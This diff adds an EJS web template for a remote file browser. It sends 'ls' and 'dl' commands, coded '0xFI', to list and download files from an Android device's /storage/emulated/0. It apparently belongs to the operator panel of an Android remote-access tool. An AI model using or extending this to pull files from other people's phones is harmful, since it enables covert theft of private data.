@@ -1,0 +1,93 @@
+<div class="ui segment">
+    <div class="ui secondary menu">
+        <div class="right menu">
+            <button onclick="openDirectory(this, '/storage/emulated/0')" class="ui blue button dlop"> <i
+                    class="icon home"></i>Home</button>
+            <!-- Home = /storage/emulated/0 -->
+        </div>
+    </div>
+    <table class="ui celled table">
+        <thead>
+            <tr>
+                <th style="text-align: center" colspan="2">Files</th>
+            </tr>
+        </thead>
+        <tbody>
+            <% pageData.forEach((item) => { %>
+            <tr>
+                <td title="<%= item.path %>"><%= item.name %></td>
+                <td class="collapsing">
+                    <% if(!item.isDir) { %>
+                    <button class="ui button dlop" onclick="downloadFile(this, '<%= item.path %>')">&nbsp;&nbsp;&nbsp;<i
+                            class="icon download blue"></i></button>
+                    <% } else { %>
+                    <button class="ui button dlop"
+                        onclick="openDirectory(this, '<%= item.path %>')">&nbsp;&nbsp;&nbsp;<i
+                            class="icon folder open grey"></i></button>
+                    <% } %>
+                </td>
+            </tr>
+            <% }) %>
+        </tbody>
+    </table>
+
+    <script>
+
+        function openDirectory(element, path) {
+            $(element).children().css("opacity", "0");
+            $(element).addClass('blue');
+            $(element).addClass('loading');
+            $('.dlop').addClass('disabled');
+            sendCommand('0xFI', {
+                action: 'ls',
+                path
+            }, (error, message) => {
+                if (error) {
+                    setTimeout(() => {
+                        showNotification('#f03434', error)
+                        $(element).children().css("opacity", "1");
+                        $(element).removeClass('blue');
+                        $('.dlop').removeClass('loading')
+                    }, 300)
+                } else {
+                    if (message === 'Requested') {
+                        showNotification('#2ecc71', 'Requesting Files, Please Wait');
+                        setTimeout(() => {
+                            location.reload();
+                        }, 500)
+                    }
+                }
+            })
+        }
+
+        function downloadFile(element, path) {
+            $(element).children().css("opacity", "0");
+            $(element).addClass('green');
+            $(element).addClass('loading');
+            $('.dlop').addClass('disabled');
+            sendCommand('0xFI', {
+                action: 'dl',
+                path
+            }, (error, message) => {
+                if (error) {
+                    setTimeout(() => {
+                        showNotification('#f03434', error)
+                        $(element).children().css("opacity", "1");
+                        $(element).removeClass('green');
+                        $('.dlop').removeClass('disabled')
+                    }, 300)
+                } else {
+                    if (message === 'Requested') {
+                        setTimeout(() => {
+                            $(element).children().css("opacity", "1");
+                            $(element).removeClass('green');
+                            $(element).removeClass('loading');
+                            $('.dlop').removeClass('disabled')
+                            showNotification('#2ecc71', 'Downloading File, It will be avaliable in `Downloads` Soon');
+                        }, 300)
+                    }
+                }
+            })
+        }
+    </script>
+</div>
